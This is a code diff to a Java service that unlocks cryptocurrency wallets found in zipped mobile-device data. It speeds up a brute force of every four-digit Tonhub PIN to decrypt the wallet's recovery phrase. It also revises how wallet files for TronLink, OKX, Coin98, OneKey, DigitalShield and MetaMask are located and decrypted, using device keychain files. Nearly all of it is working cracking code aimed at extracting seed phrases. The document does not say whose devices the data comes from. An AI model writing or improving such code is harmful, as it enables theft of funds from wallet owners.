@@ -8,7 +8,11 @@ import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Locale;
 import java.util.Map;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.Future;
 import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.concurrent.atomic.AtomicInteger;
 import java.util.concurrent.atomic.AtomicReference;
 import java.util.function.BiConsumer;
 
@@ -122,18 +126,16 @@ public class WalletUnlockService {
     public Map<String, Object> bruteTonhub(Path zip, BiConsumer<Integer, Integer> onProgress) {
         Map<String, Object> fail = new LinkedHashMap<>();
         fail.put("ok", false);
-        byte[] mmkv = findMemberBytes(zip, name -> {
-            String n = name.toLowerCase(Locale.ROOT);
-            return n.endsWith(".mmkv") || n.contains("mmkv");
-        });
+        byte[] mmkv = readTonhubMmkv(zip);
         if (mmkv == null) {
-            fail.put("error", "未找到 mmkv");
+            fail.put("error", "未找到 mmkv.default");
             return fail;
         }
         Map<String, Object> info;
         try {
             info = TonhubCrypto.parseMmkv(mmkv);
         } catch (Exception e) {
+            log.warn("tonhub brute parse fail archive={}: {}", zip.getFileName(), e.toString());
             fail.put("error", e.getMessage());
             return fail;
         }
@@ -145,24 +147,64 @@ public class WalletUnlockService {
         String salt = String.valueOf(info.get("salt"));
         byte[] encAppKey = (byte[]) info.get("enc_app_key");
         int total = 10000;
-        for (int i = 0; i < total; i++) {
-            if (onProgress != null && (i % 50 == 0 || i + 1 == total)) {
-                onProgress.accept(i, total);
+        int threads = 8;
+        AtomicInteger tried = new AtomicInteger();
+        AtomicReference<String> hitPin = new AtomicReference<>();
+        AtomicReference<String> hitPhrase = new AtomicReference<>();
+        ExecutorService pool = Executors.newFixedThreadPool(threads, r -> {
+            Thread t = new Thread(r, "tonhub-brute");
+            t.setDaemon(true);
+            return t;
+        });
+        try {
+            int chunk = (total + threads - 1) / threads;
+            List<Future<?>> jobs = new ArrayList<>();
+            for (int start = 0; start < total; start += chunk) {
+                int from = start;
+                int to = Math.min(start + chunk, total);
+                jobs.add(pool.submit(() -> {
+                    for (int i = from; i < to; i++) {
+                        if (hitPin.get() != null) {
+                            return;
+                        }
+                        String pin = String.format("%04d", i);
+                        String phrase = TonhubCrypto.decryptPin(pin, salt, encAppKey, secretKeyEnc);
+                        int n = tried.incrementAndGet();
+                        if (onProgress != null && n % 200 == 0) {
+                            synchronized (tried) {
+                                onProgress.accept(Math.min(n, total), total);
+                            }
+                        }
+                        if (phrase != null && TonhubCrypto.phraseOk(phrase) && hitPin.compareAndSet(null, pin)) {
+                            hitPhrase.set(phrase);
+                            return;
+                        }
+                    }
+                }));
             }
-            String pin = String.format("%04d", i);
-            String phrase = TonhubCrypto.decryptPin(pin, salt, encAppKey, secretKeyEnc);
-            if (phrase != null && TonhubCrypto.phraseOk(phrase)) {
-                if (onProgress != null) {
-                    onProgress.accept(i + 1, total);
-                }
-                Map<String, Object> ok = new LinkedHashMap<>();
-                ok.put("ok", true);
-                ok.put("pin", pin);
-                ok.put("phrase", phrase);
-                ok.put("tried", i + 1);
-                ok.put("total", total);
-                return ok;
+            for (Future<?> job : jobs) {
+                job.get();
             }
+        } catch (Exception e) {
+            log.warn("tonhub brute interrupted archive={}: {}", zip.getFileName(), e.toString());
+            fail.put("error", "爆破中断");
+            fail.put("tried", tried.get());
+            fail.put("total", total);
+            return fail;
+        } finally {
+            pool.shutdownNow();
+        }
+        if (hitPin.get() != null) {
+            if (onProgress != null) {
+                onProgress.accept(total, total);
+            }
+            Map<String, Object> ok = new LinkedHashMap<>();
+            ok.put("ok", true);
+            ok.put("pin", hitPin.get());
+            ok.put("phrase", hitPhrase.get());
+            ok.put("tried", tried.get());
+            ok.put("total", total);
+            return ok;
         }
         if (onProgress != null) {
             onProgress.accept(total, total);
@@ -267,8 +309,7 @@ public class WalletUnlockService {
         List<String> phrases = new ArrayList<>();
         boolean tried = false;
         ArchiveIO.walk(zip, null, (name, in, size) -> {
-            String nl = name.toLowerCase(Locale.ROOT).replace('\\', '/');
-            if (!(nl.contains("/keystore/") || nl.contains("keystore/")) || nl.endsWith("/")) {
+            if (!isTronlinkKeystoreMember(name)) {
                 ArchiveIO.skipFully(in, size);
                 return;
             }
@@ -298,8 +339,7 @@ public class WalletUnlockService {
         // mark tried by walking again lightly — if any keystore json existed
         AtomicReference<Boolean> saw = new AtomicReference<>(false);
         ArchiveIO.walk(zip, null, (name, in, size) -> {
-            String nl = name.toLowerCase(Locale.ROOT);
-            if (nl.contains("keystore") && !nl.endsWith("/")) {
+            if (isTronlinkKeystoreMember(name)) {
                 saw.set(true);
             }
             ArchiveIO.skipFully(in, size);
@@ -314,6 +354,21 @@ public class WalletUnlockService {
         return failKey("tronlink", "未找到 keystore");
     }
 
+    /** keystore 目录，或导出被裁成 {@code .../UTC--*} 的以太坊 keystore 文件名。 */
+    private static boolean isTronlinkKeystoreMember(String name) {
+        if (name == null || name.isEmpty()) {
+            return false;
+        }
+        String nl = name.toLowerCase(Locale.ROOT).replace('\\', '/');
+        if (nl.endsWith("/")) {
+            return false;
+        }
+        if (nl.contains("/keystore/") || nl.contains("keystore/") || nl.startsWith("keystore/")) {
+            return true;
+        }
+        return ArchiveIO.baseName(nl).startsWith("utc--");
+    }
+
     private Map<String, Object> unlockTrust(Path zip, String password) {
         Map<String, String> utc = new LinkedHashMap<>();
         utc.put("_", password);
@@ -325,12 +380,9 @@ public class WalletUnlockService {
     }
 
     private Map<String, Object> unlockTonhub(Path zip, String password) {
-        byte[] mmkv = findMemberBytes(zip, name -> {
-            String n = name.toLowerCase(Locale.ROOT);
-            return n.endsWith(".mmkv") || n.contains("mmkv");
-        });
+        byte[] mmkv = readTonhubMmkv(zip);
         if (mmkv == null) {
-            return failKey("tonhub", "未找到 mmkv");
+            return failKey("tonhub", "未找到 mmkv.default");
         }
         String pin = password.trim();
         if (pin.isEmpty()) {
@@ -351,17 +403,7 @@ public class WalletUnlockService {
     }
 
     private Map<String, Object> unlockOkx(Path zip, String password, String deviceId) {
-        byte[] walletDb = findMemberBytes(zip, name -> {
-            String n = name.replace('\\', '/').toLowerCase(Locale.ROOT);
-            String base = ArchiveIO.baseName(name).toLowerCase(Locale.ROOT);
-            return "wallet".equals(base) || n.endsWith("/wallet") || n.endsWith("/documents/wallet");
-        });
-        if (walletDb != null && walletDb.length >= 16) {
-            String head = new String(walletDb, 0, 15, StandardCharsets.UTF_8);
-            if (!head.startsWith("SQLite format 3")) {
-                walletDb = null;
-            }
-        }
+        byte[] walletDb = readOkxWalletDb(zip);
         Path kc = findKeychain(deviceId);
         String kcText = KeychainXml.readString(kc);
         List<byte[]> vaults = new ArrayList<>();
@@ -382,15 +424,11 @@ public class WalletUnlockService {
     }
 
     private Map<String, Object> unlockCoin98(Path zip, String password, String deviceId) {
-        byte[] enc = findMemberBytes(zip, n -> ArchiveIO.baseName(n).equalsIgnoreCase("mmkv.default.enc"));
-        byte[] crc = findMemberBytes(zip, n -> {
-            String b = ArchiveIO.baseName(n).toLowerCase(Locale.ROOT);
-            return b.equals("mmkv.default.enc.crc") || b.endsWith(".enc.crc");
-        });
-        byte[] plain = findMemberBytes(zip, n -> {
-            String b = ArchiveIO.baseName(n).toLowerCase(Locale.ROOT);
-            return b.equals("mmkv.default") && !n.toLowerCase(Locale.ROOT).endsWith(".enc");
-        });
+        String encName = firstMemberByBase(zip, "mmkv.default.enc");
+        String plainName = firstMemberByBase(zip, "mmkv.default");
+        byte[] enc = encName == null ? null : ArchiveIO.readMember(zip, encName, 8_000_000);
+        byte[] crc = encName == null ? null : ArchiveIO.readMember(zip, sibling(encName, "mmkv.default.enc.crc"), 8_000_000);
+        byte[] plain = plainName == null ? null : ArchiveIO.readMember(zip, plainName, 8_000_000);
         Path kc = findKeychain(deviceId);
         String kcText = KeychainXml.readString(kc);
         Map<String, Object> r = Coin98Mmkv.unlock(enc, crc, plain, password, kcText, bip39Util,
@@ -399,10 +437,7 @@ public class WalletUnlockService {
     }
 
     private Map<String, Object> unlockOnekey(Path zip, String password, String deviceId) {
-        byte[] raw = findMemberBytes(zip, n -> {
-            String b = ArchiveIO.baseName(n);
-            return "OneKeyV5".equals(b) || "DigitalShieldV5".equals(b);
-        });
+        byte[] raw = readPreferredNonEmpty(zip, 8_000_000, "OneKeyV5", "DigitalShieldV5");
         if (raw == null) {
             return failKey("onekey", "未找到 OneKeyV5 数据库");
         }
@@ -412,10 +447,7 @@ public class WalletUnlockService {
     }
 
     private Map<String, Object> unlockDigitalshield(Path zip, String password) {
-        byte[] raw = findMemberBytes(zip, n -> {
-            String b = ArchiveIO.baseName(n);
-            return "DigitalShieldV5".equals(b) || "OneKeyV5".equals(b);
-        });
+        byte[] raw = readPreferredNonEmpty(zip, 8_000_000, "DigitalShieldV5", "OneKeyV5");
         if (raw == null) {
             return failKey("digitalshield", "未找到 DigitalShieldV5 数据库");
         }
@@ -663,7 +695,12 @@ public class WalletUnlockService {
                 return fromEnt;
             }
         }
-        String text = new String(plain, StandardCharsets.UTF_8).trim().replace("\"", "");
+        // 只去掉首尾引号。整段 replace 掉 " 会把 Keyring JSON 拆坏，
+        // MetaMask 的 mnemonic 是字节数组，拆坏后只能报密码错误。
+        String text = new String(plain, StandardCharsets.UTF_8).trim();
+        if (text.length() >= 2 && text.charAt(0) == '"' && text.charAt(text.length() - 1) == '"') {
+            text = text.substring(1, text.length() - 1);
+        }
         try {
             Object obj = JSON.parse(text);
             String fromObj = mnemonicFromKeyringObj(obj);
@@ -724,6 +761,116 @@ public class WalletUnlockService {
             }
         }
         return null;
+    }
+
+    /**
+     * 对齐 Python {@code find_okx_wallet_db}：先用根目录 {@code Documents/wallet}，
+     * 且文件头是 SQLite；否则用第一个文件名正好是 {@code wallet} 且是 SQLite 的成员；
+     * 都不是再退回第一个 {@code wallet}。
+     */
+    private byte[] readOkxWalletDb(Path zip) {
+        String exact = null;
+        List<String> named = new ArrayList<>();
+        for (String name : ArchiveIO.listMembers(zip)) {
+            String n = ArchiveIO.normalize(name);
+            if (exact == null && "Documents/wallet".equals(n)) {
+                exact = n;
+            }
+            if ("wallet".equals(ArchiveIO.baseName(n))) {
+                named.add(n);
+            }
+        }
+        if (exact != null) {
+            byte[] raw = ArchiveIO.readMember(zip, exact, 8_000_000);
+            if (isSqlite(raw)) {
+                return raw;
+            }
+        }
+        byte[] first = null;
+        for (String name : named) {
+            byte[] raw = ArchiveIO.readMember(zip, name, 8_000_000);
+            if (first == null) {
+                first = raw;
+            }
+            if (isSqlite(raw)) {
+                return raw;
+            }
+        }
+        return first;
+    }
+
+    private static boolean isSqlite(byte[] raw) {
+        if (raw == null || raw.length < 15) {
+            return false;
+        }
+        return "SQLite format 3".equals(new String(raw, 0, 15, StandardCharsets.US_ASCII));
+    }
+
+    /** 对齐 Python {@code find_coin98_mmkv_files}：校验文件只取 enc 同目录的 {@code mmkv.default.enc.crc}。 */
+    private static String sibling(String member, String fileName) {
+        String n = ArchiveIO.normalize(member);
+        int i = n.lastIndexOf('/');
+        return i < 0 ? fileName : n.substring(0, i + 1) + fileName;
+    }
+
+    private String firstMemberByBase(Path zip, String baseName) {
+        for (String name : ArchiveIO.listMembers(zip)) {
+            if (baseName.equals(ArchiveIO.baseName(name))) {
+                return ArchiveIO.normalize(name);
+            }
+        }
+        return null;
+    }
+
+    /**
+     * 对齐 Python {@code find_local_db}：按给定文件名顺序找，前面的名字找不到再退到下一个。
+     * 空文件跳过。
+     */
+    private byte[] readPreferredNonEmpty(Path zip, int maxBytes, String... names) {
+        String[] found = new String[names.length];
+        ArchiveIO.walk(zip, null, (name, in, size) -> {
+            if (size == 0) {
+                return;
+            }
+            String base = ArchiveIO.baseName(name);
+            for (int i = 0; i < names.length; i++) {
+                if (found[i] == null && names[i].equals(base)) {
+                    found[i] = ArchiveIO.normalize(name);
+                    return;
+                }
+            }
+        }, 0);
+        for (String member : found) {
+            if (member == null) {
+                continue;
+            }
+            byte[] raw = ArchiveIO.readMember(zip, member, maxBytes);
+            if (raw != null && raw.length > 0) {
+                return raw;
+            }
+        }
+        return null;
+    }
+
+    /**
+     * 对齐 Python：只用文件名正好是 mmkv.default 的成员。
+     * 这个包里 react-query 排在前面，名字也带 mmkv，但没有 salt。
+     */
+    private byte[] readTonhubMmkv(Path zip) {
+        String chosen = null;
+        for (String name : ArchiveIO.listMembers(zip)) {
+            if ("mmkv.default".equals(ArchiveIO.baseName(name))) {
+                chosen = name;
+                break;
+            }
+        }
+        if (chosen == null) {
+            log.warn("tonhub mmkv.default missing archive={}", zip.getFileName());
+            return null;
+        }
+        byte[] raw = ArchiveIO.readMember(zip, chosen, 8_000_000);
+        log.info("tonhub mmkv member={} bytes={}", chosen, raw == null ? 0 : raw.length);
+        return raw;
     }
 
     private byte[] findMemberBytes(Path zip, java.util.function.Predicate<String> pred) {
